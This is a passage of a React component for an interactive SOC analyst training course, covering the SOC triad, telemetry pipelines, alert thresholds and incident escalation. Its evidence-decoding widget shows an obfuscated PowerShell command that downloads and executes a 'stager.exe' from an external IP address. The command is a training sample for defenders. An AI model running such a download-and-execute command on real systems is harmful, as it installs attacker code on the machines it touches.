'use client';

import React, { useState, useEffect } from 'react';
import {
  Shield,
  Activity,
  CheckCircle2,
  AlertTriangle,
  Clock,
  ArrowRight,
  ChevronRight,
  ChevronLeft,
  Award,
  Zap,
  Lock,
  RefreshCw,
  Sliders,
  FileText,
  Users,
  Search,
  ExternalLink,
  Info,
  Server,
  Terminal,
  Cpu,
  Radio,
  FileCode,
  Flame,
  ArrowLeft,
  Check,
  PhoneCall,
  Laptop,
  Network,
  Bug,
  Globe,
  SlidersHorizontal,
  Send,
  Eye,
  Crosshair,
  UserCheck,
  Building,
  Key,
  FlaskConical,
} from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { Card, CardContent } from '@/components/ui/card';
import { useProgressStore } from '@/store/progress-store';
import { useToast } from '@/components/ui/toast-provider';
import { TopicContent, UnitStructure } from '@/data/modules/module-04-units';

interface TopicStoryFlowProps {
  topic: TopicContent;
  unit: UnitStructure;
  isCompleted: boolean;
  onComplete: (topicId: string, xpReward: number) => void;
  onNext: () => void;
  hasNext: boolean;
  onPrevious: () => void;
  hasPrevious: boolean;
  onBackToOverview: () => void;
}

export function TopicStoryFlow({
  topic,
  unit,
  isCompleted,
  onComplete,
  onNext,
  hasNext,
  onPrevious,
  hasPrevious,
  onBackToOverview,
}: TopicStoryFlowProps) {
  const { showToast } = useToast();
  const [topicFinished, setTopicFinished] = useState(isCompleted);

  useEffect(() => {
    setTopicFinished(isCompleted);
  }, [isCompleted]);

  const handleFinish = () => {
    if (!topicFinished) {
      setTopicFinished(true);
      onComplete(topic.id, topic.xpReward);
    }
  };

  return (
    <div className="space-y-6 max-w-4xl mx-auto pb-16 animate-fade-in">
      {/* Top Navigation Bar: Minimal & Clean */}
      <div className="flex items-center justify-between p-3.5 rounded-2xl border bg-card/80 backdrop-blur-xs sticky top-16 z-20 shadow-xs">
        <div className="flex items-center gap-2 text-xs">
          <Button
            variant="ghost"
            size="sm"
            onClick={onBackToOverview}
            className="h-8 px-2 text-muted-foreground hover:text-foreground font-semibold"
          >
            <ArrowLeft className="w-3.5 h-3.5 mr-1" />
            Module Details
          </Button>
          <span className="text-muted-foreground">/</span>
          <span className="text-muted-foreground font-medium">{unit.title.split(':')[0]}</span>
          <span className="text-muted-foreground">/</span>
          <span className="font-bold text-foreground truncate max-w-[200px]">{topic.title}</span>
        </div>

        <div className="flex items-center gap-2">
          <Button
            variant="outline"
            size="sm"
            onClick={onPrevious}
            disabled={!hasPrevious}
            className="h-8 text-xs font-semibold"
          >
            <ChevronLeft className="w-3.5 h-3.5 mr-1" />
            Prev
          </Button>

          <Button
            variant={topicFinished ? 'default' : 'outline'}
            size="sm"
            onClick={onNext}
            disabled={!hasNext || !topicFinished}
            className={`h-8 text-xs font-semibold gap-1 ${
              !topicFinished ? 'opacity-60 cursor-not-allowed' : ''
            }`}
            title={!topicFinished ? 'Complete this topic to unlock Next' : 'Proceed to Next Topic'}
          >
            Next
            {topicFinished ? (
              <ChevronRight className="w-3.5 h-3.5" />
            ) : (
              <Lock className="w-3 h-3 text-muted-foreground" />
            )}
          </Button>
        </div>
      </div>

      {/* Story Topic Header: Clean, Cinematic & Low-Text */}
      <div className="space-y-2 border-b pb-4">
        <div className="flex items-center gap-2 flex-wrap">
          <Badge variant="outline" className="bg-primary/10 text-primary border-primary/20 text-xs font-bold">
            Chapter {unit.unitNumber}.{topic.order}
          </Badge>
          <Badge variant="secondary" className="text-xs font-mono">
            <Clock className="w-3 h-3 mr-1 inline" />
            {topic.estimatedMinutes} mins
          </Badge>
          <Badge variant="outline" className="text-xs font-bold text-emerald-600 bg-emerald-50 border-emerald-200">
            +{topic.xpReward} XP
          </Badge>
          {topicFinished ? (
            <Badge className="bg-emerald-600 text-white text-xs gap-1">
              <CheckCircle2 className="w-3 h-3" />
              Completed
            </Badge>
          ) : (
            <Badge variant="outline" className="text-xs text-amber-600 bg-amber-50 border-amber-200">
              In Progress
            </Badge>
          )}
        </div>
        <h1 className="text-2xl sm:text-3xl font-extrabold tracking-tight text-foreground">
          {topic.title}
        </h1>
        <p className="text-xs sm:text-sm text-muted-foreground max-w-2xl leading-relaxed">
          {topic.theory.summaryLines[0]}
        </p>
      </div>

      {/* Tailored Story-Driven Experience for Each Topic across the 7 Units */}
      {topic.id === 'topic-1-1' && <StoryTopic11 onComplete={handleFinish} isDone={topicFinished} />}
      {topic.id === 'topic-1-2' && <StoryTopic12 onComplete={handleFinish} isDone={topicFinished} />}
      {topic.id === 'topic-2-1' && <StoryTopic21 onComplete={handleFinish} isDone={topicFinished} />}
      {topic.id === 'topic-2-2' && <StoryTopic22 onComplete={handleFinish} isDone={topicFinished} />}
      {topic.id === 'topic-3-1' && <StoryTopic31 onComplete={handleFinish} isDone={topicFinished} />}
      {topic.id === 'topic-3-2' && <StoryTopic32 onComplete={handleFinish} isDone={topicFinished} />}
      {topic.id === 'topic-4-1' && <StoryTopic41 onComplete={handleFinish} isDone={topicFinished} />}
      {topic.id === 'topic-4-2' && <StoryTopic42 onComplete={handleFinish} isDone={topicFinished} />}
      {topic.id === 'topic-5-1' && <StoryTopic51 onComplete={handleFinish} isDone={topicFinished} />}
      {topic.id === 'topic-5-2' && <StoryTopic52 onComplete={handleFinish} isDone={topicFinished} />}
      {topic.id === 'topic-6-1' && <StoryTopic61 onComplete={handleFinish} isDone={topicFinished} />}
      {topic.id === 'topic-6-2' && <StoryTopic62 onComplete={handleFinish} isDone={topicFinished} />}
      {topic.id === 'topic-7-1' && <StoryTopic71 onComplete={handleFinish} isDone={topicFinished} />}
      {topic.id === 'topic-7-2' && <StoryTopic72 onComplete={handleFinish} isDone={topicFinished} />}

      {/* Completion & Next Action */}
      <div className="p-6 rounded-2xl border bg-card/60 text-center space-y-4 shadow-xs mt-8">
        <div className="flex flex-col sm:flex-row items-center justify-between gap-4 max-w-lg mx-auto">
          <div className="text-left space-y-0.5">
            <h4 className="text-sm font-bold text-foreground">
              {topicFinished ? 'Topic Completed & Saved 🎉' : 'Topic Requirements'}
            </h4>
            <p className="text-xs text-muted-foreground">
              {topicFinished
                ? 'Your mastery has been recorded. Next topic is now unlocked.'
                : 'Interact with the story widget above to mark this topic complete.'}
            </p>
          </div>

          <div className="flex items-center gap-2 shrink-0">
            {!topicFinished ? (
              <Button
                onClick={handleFinish}
                className="font-bold text-xs gap-1.5 h-9 bg-primary hover:bg-primary/90 text-white"
              >
                <CheckCircle2 className="w-4 h-4" />
                Complete Topic (+{topic.xpReward} XP)
              </Button>
            ) : (
              hasNext && (
                <Button
                  onClick={onNext}
                  className="font-bold text-xs gap-1.5 h-9 bg-emerald-600 hover:bg-emerald-700 text-white"
                >
                  Continue to Next Topic
                  <ChevronRight className="w-4 h-4" />
                </Button>
              )
            )}
          </div>
        </div>
      </div>
    </div>
  );
}

// =========================================================================
// UNIT 1, TOPIC 1.1: SOC Triad (People, Process, Technology)
// Understandable Setup: The 911 Emergency Response Analogy -> Interactive Triad
// =========================================================================
function StoryTopic11({ onComplete, isDone }: { onComplete: () => void; isDone: boolean }) {
  const [selectedPillar, setSelectedPillar] = useState<'people' | 'process' | 'tech'>('people');
  const [viewMode, setViewMode] = useState<'analogy' | 'enterprise'>('analogy');
  const [interacted, setInteracted] = useState(false);

  return (
    <div className="space-y-6">
      {/* 1. Understandable Setup: 911 Center Analogy Toggle */}
      <div className="p-4 sm:p-5 rounded-2xl border bg-gradient-to-r from-blue-50/70 to-indigo-50/50 dark:from-slate-900 dark:to-slate-800 space-y-3">
        <div className="flex items-center justify-between flex-wrap gap-2">
          <div className="flex items-center gap-2">
            <span className="p-1.5 rounded-lg bg-primary/10 text-primary">
              <PhoneCall className="w-4 h-4" />
            </span>
            <span className="text-xs font-bold text-foreground uppercase tracking-wider">
              Understandable Setup: How a SOC Works
            </span>
          </div>

          <div className="flex items-center bg-card rounded-lg p-0.5 border text-xs">
            <button
              onClick={() => {
                setViewMode('analogy');
                setInteracted(true);
              }}
              className={`px-3 py-1 rounded-md font-semibold transition-all ${
                viewMode === 'analogy' ? 'bg-primary text-white shadow-xs' : 'text-muted-foreground'
              }`}
            >
              🚑 911 Emergency Analogy
            </button>
            <button
              onClick={() => {
                setViewMode('enterprise');
                setInteracted(true);
              }}
              className={`px-3 py-1 rounded-md font-semibold transition-all ${
                viewMode === 'enterprise' ? 'bg-primary text-white shadow-xs' : 'text-muted-foreground'
              }`}
            >
              🛡️ Enterprise Cyber SOC
            </button>
          </div>
        </div>

        {viewMode === 'analogy' ? (
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 text-xs pt-1">
            <div className="p-3 bg-card rounded-xl border space-y-1">
              <strong className="font-bold text-foreground flex items-center gap-1.5">
                <Users className="w-3.5 h-3.5 text-blue-600" />
                911 People
              </strong>
              <p className="text-muted-foreground leading-relaxed">
                911 Dispatcher takes calls 24/7 $\to$ Paramedics arrive on scene $\to$ ER Trauma Doctors operate.
              </p>
            </div>
            <div className="p-3 bg-card rounded-xl border space-y-1">
              <strong className="font-bold text-foreground flex items-center gap-1.5">
                <FileText className="w-3.5 h-3.5 text-amber-600" />
                911 Process
              </strong>
              <p className="text-muted-foreground leading-relaxed">
                Strict triage protocols: "Is patient breathing?" Response in under 8 minutes or lives are lost.
              </p>
            </div>
            <div className="p-3 bg-card rounded-xl border space-y-1">
              <strong className="font-bold text-foreground flex items-center gap-1.5">
                <Radio className="w-3.5 h-3.5 text-emerald-600" />
                911 Technology
              </strong>
              <p className="text-muted-foreground leading-relaxed">
                Emergency phone lines, GPS ambulance trackers, defibrillators, radio frequency dispatch.
              </p>
            </div>
          </div>
        ) : (
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 text-xs pt-1">
            <div className="p-3 bg-card rounded-xl border space-y-1">
              <strong className="font-bold text-foreground flex items-center gap-1.5">
                <Users className="w-3.5 h-3.5 text-blue-600" />
                SOC People
              </strong>
              <p className="text-muted-foreground leading-relaxed">
                Tier 1 Triage Sentry (15-min queue) $\to$ Tier 2 Incident Hunter (forensics) $\to$ Tier 3 CSIRT Lead.
              </p>
            </div>
            <div className="p-3 bg-card rounded-xl border space-y-1">
              <strong className="font-bold text-foreground flex items-center gap-1.5">
                <FileText className="w-3.5 h-3.5 text-amber-600" />
                SOC Process
              </strong>
              <p className="text-muted-foreground leading-relaxed">
                Incident Response Playbooks, Standard Operating Procedures (SOPs), and strict SLA response deadlines.
              </p>
            </div>
            <div className="p-3 bg-card rounded-xl border space-y-1">
              <strong className="font-bold text-foreground flex items-center gap-1.5">
                <Cpu className="w-3.5 h-3.5 text-emerald-600" />
                SOC Technology
              </strong>
              <p className="text-muted-foreground leading-relaxed">
                SIEM log brains (Splunk/Elastic), EDR host sensors (CrowdStrike), SOAR automated containment scripts.
              </p>
            </div>
          </div>
        )}
      </div>

      {/* 2. Interactive Triad Blueprint */}
      <div className="p-5 sm:p-6 rounded-2xl border bg-card space-y-4 shadow-xs">
        <div className="flex items-center justify-between text-xs border-b pb-3">
          <span className="font-bold text-foreground flex items-center gap-1.5">
            <Shield className="w-4 h-4 text-primary" />
            Interactive SOC Triad Blueprint (Click to Explore)
          </span>
          <span className="text-muted-foreground">Select a pillar to inspect</span>
        </div>

        {/* 3 Pillar Buttons */}
        <div className="grid grid-cols-3 gap-3">
          <button
            onClick={() => {
              setSelectedPillar('people');
              setInteracted(true);
            }}
            className={`p-3 rounded-xl border text-center transition-all ${
              selectedPillar === 'people'
                ? 'bg-blue-50 border-blue-300 dark:bg-blue-950/40 text-blue-900 dark:text-blue-200 ring-2 ring-blue-500/20 shadow-xs'
                : 'bg-muted/30 hover:bg-muted/60 text-muted-foreground'
            }`}
          >
            <Users className="w-5 h-5 mx-auto mb-1 text-blue-600" />
            <div className="font-bold text-xs">1. People</div>
            <div className="text-[10px] opacity-75">Analysts & Hunters</div>
          </button>

          <button
            onClick={() => {
              setSelectedPillar('process');
              setInteracted(true);
            }}
            className={`p-3 rounded-xl border text-center transition-all ${
              selectedPillar === 'process'
                ? 'bg-amber-50 border-amber-300 dark:bg-amber-950/40 text-amber-900 dark:text-amber-200 ring-2 ring-amber-500/20 shadow-xs'
                : 'bg-muted/30 hover:bg-muted/60 text-muted-foreground'
            }`}
          >
            <FileText className="w-5 h-5 mx-auto mb-1 text-amber-600" />
            <div className="font-bold text-xs">2. Process</div>
            <div className="text-[10px] opacity-75">Playbooks & SLAs</div>
          </button>

          <button
            onClick={() => {
              setSelectedPillar('tech');
              setInteracted(true);
            }}
            className={`p-3 rounded-xl border text-center transition-all ${
              selectedPillar === 'tech'
                ? 'bg-emerald-50 border-emerald-300 dark:bg-emerald-950/40 text-emerald-900 dark:text-emerald-200 ring-2 ring-emerald-500/20 shadow-xs'
                : 'bg-muted/30 hover:bg-muted/60 text-muted-foreground'
            }`}
          >
            <Cpu className="w-5 h-5 mx-auto mb-1 text-emerald-600" />
            <div className="font-bold text-xs">3. Technology</div>
            <div className="text-[10px] opacity-75">SIEM, EDR & SOAR</div>
          </button>
        </div>

        {/* Selected Pillar Inspection Card */}
        <div className="p-4 rounded-xl bg-muted/20 border text-xs space-y-2">
          {selectedPillar === 'people' && (
            <div className="space-y-2 animate-fade-in">
              <div className="flex items-center gap-2">
                <Badge className="bg-blue-600 text-white">Tiering Structure</Badge>
                <span className="font-bold text-foreground">Who stops the adversary?</span>
              </div>
              <p className="text-muted-foreground leading-relaxed">
                <strong>Tier 1:</strong> Rapid triage sentries (15-min SLA, queue cleanup).<br />
                <strong>Tier 2:</strong> Forensic responders (isolate infected hosts, determine root cause).<br />
                <strong>Tier 3 / Threat Hunter:</strong> Proactive adversary hunters and malware reverse engineers.
              </p>
            </div>
          )}

          {selectedPillar === 'process' && (
            <div className="space-y-2 animate-fade-in">
              <div className="flex items-center gap-2">
                <Badge className="bg-amber-600 text-white">Playbooks & SLAs</Badge>
                <span className="font-bold text-foreground">How do we act consistently under pressure?</span>
              </div>
              <p className="text-muted-foreground leading-relaxed">
                <strong>Playbooks:</strong> Step-by-step algorithms for Phishing, Ransomware, and Data Theft.<br />
                <strong>SLAs (Service Level Agreements):</strong> Guaranteed response deadlines (e.g. Critical alerts investigated in &lt; 15 minutes).<br />
                <strong>Standard Operating Procedures (SOPs):</strong> Handoff notes, evidence logging, and escalation trees.
              </p>
            </div>
          )}

          {selectedPillar === 'tech' && (
            <div className="space-y-2 animate-fade-in">
              <div className="flex items-center gap-2">
                <Badge className="bg-emerald-600 text-white">Defensive Stack</Badge>
                <span className="font-bold text-foreground">What tools empower the human analyst?</span>
              </div>
              <p className="text-muted-foreground leading-relaxed">
                <strong>SIEM (Security Information & Event Management):</strong> The central correlation brain.<br />
                <strong>EDR (Endpoint Detection & Response):</strong> Host visibility, process trees, and remote isolation.<br />
                <strong>SOAR (Security Orchestration, Automation & Response):</strong> Automated IP blocking and ticket enrichment.
              </p>
            </div>
          )}
        </div>
      </div>

      {interacted && !isDone && (
        <div className="p-3 rounded-xl bg-emerald-50 border border-emerald-200 text-xs text-emerald-900 flex items-center justify-between">
          <span>Triad explored! You have mastered the core pillars of the SOC.</span>
          <Button size="sm" onClick={onComplete} className="h-7 text-xs bg-emerald-600 hover:bg-emerald-700 text-white font-bold">
            Mark Topic Complete
          </Button>
        </div>
      )}
    </div>
  );
}

// =========================================================================
// UNIT 1, TOPIC 1.2: Data Flow & Telemetry Pipeline
// Visual Vector Pipeline with Ingestion Lag & Noise Filter Controls
// =========================================================================
function StoryTopic12({ onComplete, isDone }: { onComplete: () => void; isDone: boolean }) {
  const [lagEnabled, setLagEnabled] = useState(false);
  const [filterNoise, setFilterNoise] = useState(true);
  const [interacted, setInteracted] = useState(false);

  return (
    <div className="space-y-6">
      {/* 1. Ingestion Pipeline Vector Animation */}
      <div className="p-5 sm:p-6 rounded-2xl border bg-slate-950 text-white space-y-4 shadow-md overflow-hidden relative">
        <div className="flex items-center justify-between text-xs">
          <span className="font-mono text-emerald-400 flex items-center gap-1.5 font-bold">
            <Radio className="w-3.5 h-3.5 animate-pulse" />
            LIVE TELEMETRY STREAM
          </span>
          <span className="font-mono text-slate-400">
            {lagEnabled ? 'INGESTION LAG: 15 MINS ⚠️ (DANGEROUS)' : 'INGESTION LAG: 1.2s (HEALTHY)'}
          </span>
        </div>

        {/* Animated Vector SVG Pipeline */}
        <div className="py-4">
          <svg viewBox="0 0 700 110" className="w-full h-auto">
            <path
              d="M 60 55 L 640 55"
              stroke="#334155"
              strokeWidth="6"
              strokeDasharray="8 8"
              fill="none"
            />
            <circle cx={lagEnabled ? '200' : '450'} cy="55" r="7" fill="#10B981">
              <animate
                attributeName="cx"
                from="60"
                to="640"
                dur={lagEnabled ? '8s' : '2.2s'}
                repeatCount="indefinite"
              />
            </circle>
            <circle cx={lagEnabled ? '100' : '300'} cy="55" r="5" fill="#38BDF8">
              <animate
                attributeName="cx"
                from="60"
                to="640"
                dur={lagEnabled ? '7s' : '1.8s'}
                repeatCount="indefinite"
              />
            </circle>

            {/* Stage 1: Endpoint */}
            <g transform="translate(30, 25)">
              <rect width="60" height="60" rx="12" fill="#1E293B" stroke="#475569" strokeWidth="2" />
              <text x="30" y="32" fill="#E2E8F0" fontSize="10" fontWeight="bold" textAnchor="middle">ENDPOINT</text>
              <text x="30" y="46" fill="#94A3B8" fontSize="8" textAnchor="middle">Sysmon</text>
            </g>

            {/* Stage 2: Forwarder */}
            <g transform="translate(220, 25)">
              <rect width="60" height="60" rx="12" fill="#1E293B" stroke="#475569" strokeWidth="2" />
              <text x="30" y="32" fill="#E2E8F0" fontSize="10" fontWeight="bold" textAnchor="middle">AGENT</text>
              <text x="30" y="46" fill="#38BDF8" fontSize="8" textAnchor="middle">Forwarder</text>
            </g>

            {/* Stage 3: Normalizer */}
            <g transform="translate(410, 25)">
              <rect width="60" height="60" rx="12" fill="#1E293B" stroke="#475569" strokeWidth="2" />
              <text x="30" y="32" fill="#E2E8F0" fontSize="10" fontWeight="bold" textAnchor="middle">PARSER</text>
              <text x="30" y="46" fill="#F59E0B" fontSize="8" textAnchor="middle">ECS Schema</text>
            </g>

            {/* Stage 4: SIEM Queue */}
            <g transform="translate(600, 25)">
              <rect width="60" height="60" rx="12" fill="#064E3B" stroke="#10B981" strokeWidth="2" />
              <text x="30" y="32" fill="#A7F3D0" fontSize="10" fontWeight="bold" textAnchor="middle">SIEM</text>
              <text x="30" y="46" fill="#6EE7B7" fontSize="8" textAnchor="middle">L1 Triage</text>
            </g>
          </svg>
        </div>

        {/* Interactive Signal Controls */}
        <div className="pt-3 border-t border-slate-800 flex flex-wrap items-center justify-between gap-3 text-xs">
          <div className="flex items-center gap-2">
            <span className="text-slate-400">Tuner Controls:</span>
            <Button
              size="sm"
              variant={lagEnabled ? 'destructive' : 'outline'}
              onClick={() => {
                setLagEnabled(!lagEnabled);
                setInteracted(true);
              }}
              className="h-7 text-[11px] border-slate-700 font-semibold"
            >
              {lagEnabled ? 'Disable Pipeline Lag' : 'Simulate 15-Min Lag'}
            </Button>
            <Button
              size="sm"
              variant={filterNoise ? 'secondary' : 'outline'}
              onClick={() => {
                setFilterNoise(!filterNoise);
                setInteracted(true);
              }}
              className="h-7 text-[11px] border-slate-700 font-semibold"
            >
              {filterNoise ? 'Noise Filter: Active' : 'Noise Filter: Bypassed'}
            </Button>
          </div>

          <span className="text-emerald-400 font-mono text-[11px]">
            {filterNoise ? 'Normalized EPS: 4,200/s' : 'Raw EPS: 48,000/s'}
          </span>
        </div>
      </div>

      {/* 3 Golden Rules of Telemetry */}
      <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 text-xs">
        <div className="p-3.5 rounded-xl border bg-card space-y-1">
          <strong className="text-foreground flex items-center gap-1.5 font-bold">
            <Cpu className="w-3.5 h-3.5 text-primary" />
            1. Ingestion Lag Kills
          </strong>
          <p className="text-muted-foreground">If logs buffer for 15 minutes, adversary dwell time is already 15 minutes ahead.</p>
        </div>
        <div className="p-3.5 rounded-xl border bg-card space-y-1">
          <strong className="text-foreground flex items-center gap-1.5 font-bold">
            <Terminal className="w-3.5 h-3.5 text-primary" />
            2. Field Normalization
          </strong>
          <p className="text-muted-foreground">Vendor fields standardize into common schemas (`process.name`, `source.ip`).</p>
        </div>
        <div className="p-3.5 rounded-xl border bg-card space-y-1">
          <strong className="text-foreground flex items-center gap-1.5 font-bold">
            <Shield className="w-3.5 h-3.5 text-primary" />
            3. Signal Over Noise
          </strong>
          <p className="text-muted-foreground">Focus on behavioral indicators rather than blinding analysts in floods of raw logs.</p>
        </div>
      </div>

      {interacted && !isDone && (
        <div className="p-3 rounded-xl bg-emerald-50 border border-emerald-200 text-xs text-emerald-900 flex items-center justify-between">
          <span>Simulation explored! You have mastered telemetry mechanics.</span>
          <Button size="sm" onClick={onComplete} className="h-7 text-xs bg-emerald-600 hover:bg-emerald-700 text-white font-bold">
            Mark Topic Complete
          </Button>
        </div>
      )}
    </div>
  );
}

// =========================================================================
// UNIT 2, TOPIC 2.1: Events vs. Alerts (Signal from Noise)
// Interactive Rule Threshold Slider
// =========================================================================
function StoryTopic21({ onComplete, isDone }: { onComplete: () => void; isDone: boolean }) {
  const [threshold, setThreshold] = useState<number>(5);
  const [interacted, setInteracted] = useState(false);

  const rawEvents = 10000;
  const triggeredAlerts = threshold <= 3 ? 42 : threshold <= 8 ? 1 : 0;

  return (
    <div className="space-y-6">
      {/* Interactive Threshold Tuner */}
      <div className="p-5 sm:p-6 rounded-2xl border bg-card space-y-4 shadow-xs">
        <div className="flex items-center justify-between text-xs border-b pb-3">
          <span className="font-bold text-foreground flex items-center gap-1.5">
            <SlidersHorizontal className="w-4 h-4 text-primary" />
            Correlation Rule Simulator: Brute-Force Detection Threshold
          </span>
          <Badge variant="outline" className="font-mono text-xs">
            {triggeredAlerts === 1 ? 'High Fidelity (1 Alert)' : `${triggeredAlerts} Alerts`}
          </Badge>
        </div>

        <div className="space-y-3">
          <div className="flex items-center justify-between text-xs font-semibold">
            <span>Rule: Alert if Failed Logins per Minute exceeds:</span>
            <span className="font-bold text-primary font-mono">{threshold} attempts/min</span>
          </div>

          <input
            type="range"
            min="1"
            max="15"
            value={threshold}
            onChange={(e) => {
              setThreshold(parseInt(e.target.value));
              setInteracted(true);
            }}
            className="w-full accent-primary cursor-pointer h-2 bg-muted rounded-lg"
          />

          <div className="flex items-center justify-between text-[11px] text-muted-foreground">
            <span>1 (Too sensitive: 42 false alarms)</span>
            <span className="font-bold text-emerald-600">5-8 (Optimal: 1 Real Attack Alert)</span>
            <span>15 (Too loose: Misses brute force)</span>
          </div>
        </div>

        {/* Live Filter Result */}
        <div className="grid grid-cols-2 gap-3 pt-2 text-center text-xs">
          <div className="p-3 rounded-xl bg-muted/30 border">
            <div className="text-muted-foreground text-[10px] uppercase font-bold">Raw Telemetry Events</div>
            <div className="text-xl font-extrabold text-foreground font-mono mt-0.5">10,000 / sec</div>
            <p className="text-[10px] text-muted-foreground mt-0.5">Routine logins, DNS pings, file reads</p>
          </div>

          <div className={`p-3 rounded-xl border transition-all ${
            triggeredAlerts === 1
              ? 'bg-emerald-50 dark:bg-emerald-950/30 border-emerald-300 text-emerald-900 dark:text-emerald-200'
              : triggeredAlerts > 1
              ? 'bg-amber-50 dark:bg-amber-950/30 border-amber-300 text-amber-900 dark:text-amber-200'
              : 'bg-muted/30 border'
          }`}>
            <div className="text-[10px] uppercase font-bold">SIEM Alerts Fired</div>
            <div className="text-xl font-extrabold font-mono mt-0.5">{triggeredAlerts} Actionable Alert</div>
            <p className="text-[10px] opacity-80 mt-0.5">
              {triggeredAlerts === 1 ? 'Perfect signal-to-noise ratio! 🎯' : triggeredAlerts > 1 ? 'Alert fatigue risk!' : 'Rule blind spot!'}
            </p>
          </div>
        </div>
      </div>

      {/* Distinction Summary */}
      <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 text-xs">
        <div className="p-4 rounded-xl border bg-card space-y-1.5">
          <Badge variant="outline" className="text-blue-700 bg-blue-50 border-blue-200">Raw Event</Badge>
          <h4 className="font-bold text-foreground">Any Observable System Action</h4>
          <p className="text-muted-foreground">A single user login, a file write, or a DNS lookup. Happens billions of times daily; 99.999% normal.</p>
        </div>

        <div className="p-4 rounded-xl border bg-card space-y-1.5">
          <Badge variant="outline" className="text-rose-700 bg-rose-50 border-rose-200">Security Alert</Badge>
          <h4 className="font-bold text-foreground">A Rule Violation or Anomaly</h4>
          <p className="text-muted-foreground">Generated when correlated events match detection logic. Demands human or automated triage decision.</p>
        </div>
      </div>

      {interacted && !isDone && (
        <div className="p-3 rounded-xl bg-emerald-50 border border-emerald-200 text-xs text-emerald-900 flex items-center justify-between">
          <span>Threshold explored! You understand how events convert into actionable alerts.</span>
          <Button size="sm" onClick={onComplete} className="h-7 text-xs bg-emerald-600 hover:bg-emerald-700 text-white font-bold">
            Mark Topic Complete
          </Button>
        </div>
      )}
    </div>
  );
}

// =========================================================================
// UNIT 2, TOPIC 2.2: Incidents vs. Cases (Escalation Lifecycle)
// Interactive 4-Stage Lifecycle Board
// =========================================================================
function StoryTopic22({ onComplete, isDone }: { onComplete: () => void; isDone: boolean }) {
  const [currentStage, setCurrentStage] = useState<number>(0);

  const stages = [
    {
      title: '1. Raw System Event',
      badge: 'Atomic Log',
      detail: 'Inbound packet logged on port 445 from internal workstation WKSTN-09. Standard network telemetry.',
      icon: Terminal,
      color: 'text-slate-600',
    },
    {
      title: '2. Security Alert Triggered',
      badge: 'Rule Match',
      detail: 'SIEM rule fires: "Port 445 SMB sweep across internal subnet". High priority triage alert queued.',
      icon: AlertTriangle,
      color: 'text-amber-600',
    },
    {
      title: '3. Incident Declared',
      badge: 'Verified Threat',
      detail: 'Analyst confirms active lateral movement worm on WKSTN-09. Policy breach and business harm confirmed.',
      icon: Flame,
      color: 'text-rose-600',
    },
    {
      title: '4. Case Container Created',
      badge: 'Master Ticket #SEC-892',
      detail: 'All related alerts, 3 affected endpoints, compromised credentials, and forensic timeline bound in ServiceNow Case.',
      icon: FileCode,
      color: 'text-purple-600',
    },
  ];

  const handleNextStage = () => {
    if (currentStage < stages.length - 1) {
      setCurrentStage(currentStage + 1);
      if (currentStage + 1 === stages.length - 1) {
        onComplete();
      }
    }
  };

  return (
    <div className="space-y-6">
      <div className="p-5 sm:p-6 rounded-2xl border bg-card space-y-4 shadow-xs">
        <div className="flex items-center justify-between text-xs border-b pb-3">
          <span className="font-bold text-foreground flex items-center gap-1.5">
            <Activity className="w-4 h-4 text-primary" />
            Lifecycle Board: Promoting Telemetry to a Master Case
          </span>
          <span className="font-mono text-muted-foreground">Stage {currentStage + 1} of 4</span>
        </div>

        {/* 4 Stage Pills */}
        <div className="grid grid-cols-4 gap-2">
          {stages.map((st, i) => (
            <div
              key={i}
              className={`p-2 rounded-xl border text-center transition-all ${
                currentStage === i
                  ? 'bg-primary text-white shadow-xs font-bold'
                  : currentStage > i
                  ? 'bg-emerald-50 dark:bg-emerald-950/30 text-emerald-700 border-emerald-200'
                  : 'bg-muted/30 text-muted-foreground opacity-60'
              }`}
            >
              <div className="text-[10px]">{st.badge}</div>
            </div>
          ))}
        </div>

        {/* Stage Content Card */}
        <div className="p-5 rounded-xl bg-muted/20 border space-y-3">
          <div className="flex items-center justify-between">
            <h4 className="text-base font-bold text-foreground">{stages[currentStage].title}</h4>
            <Badge variant="outline" className="text-xs font-semibold">Active Stage</Badge>
          </div>
          <p className="text-xs text-muted-foreground leading-relaxed">
            {stages[currentStage].detail}
          </p>
        </div>

        <div className="flex items-center justify-between pt-2">
          <Button
            size="sm"
            variant="outline"
            disabled={currentStage === 0}
            onClick={() => setCurrentStage(Math.max(0, currentStage - 1))}
            className="text-xs"
          >
            Previous Stage
          </Button>

          {currentStage < stages.length - 1 ? (
            <Button size="sm" onClick={handleNextStage} className="text-xs font-bold gap-1">
              Promote to Next Stage
              <ArrowRight className="w-3.5 h-3.5" />
            </Button>
          ) : (
            <Badge className="bg-emerald-600 text-white text-xs gap-1 py-1 px-3">
              <CheckCircle2 className="w-3.5 h-3.5" />
              Master Case Assembled!
            </Badge>
          )}
        </div>
      </div>
    </div>
  );
}

// =========================================================================
// UNIT 3, TOPIC 3.1: Understanding Alert & Checking Evidence
// Base64 Decoder + Process Tree Inspector
// =========================================================================
function StoryTopic31({ onComplete, isDone }: { onComplete: () => void; isDone: boolean }) {
  const [decoded, setDecoded] = useState(false);

  return (
    <div className="space-y-6">
      {/* Interactive Evidence Decoder */}
      <div className="p-5 sm:p-6 rounded-2xl border bg-card space-y-4 shadow-xs">
        <div className="flex items-center justify-between text-xs border-b pb-3">
          <span className="font-bold text-foreground flex items-center gap-1.5">
            <Terminal className="w-4 h-4 text-primary" />
            Evidence Inspector: De-obfuscating Attacker Payload
          </span>
          <Badge variant="outline" className="text-rose-700 bg-rose-50 border-rose-200 text-xs">
            MITRE T1059.001
          </Badge>
        </div>

        {/* Obfuscated Command Box */}
        <div className="space-y-2">
          <span className="text-xs text-muted-foreground font-semibold">Raw Process Execution Command:</span>
          <div className="p-3 rounded-xl bg-slate-950 font-mono text-xs text-amber-400 break-all border border-slate-800">
            powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnaAB0AHQAcAA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgA1AC8AcwB0AGEAZwBlAHIALgBlAHgAZQAnACkA
          </div>
        </div>

        {/* Decode Action Button */}
        <div className="flex items-center justify-between">
          <Button
            size="sm"
            onClick={() => {
              setDecoded(!decoded);
              if (!decoded) onComplete();
            }}
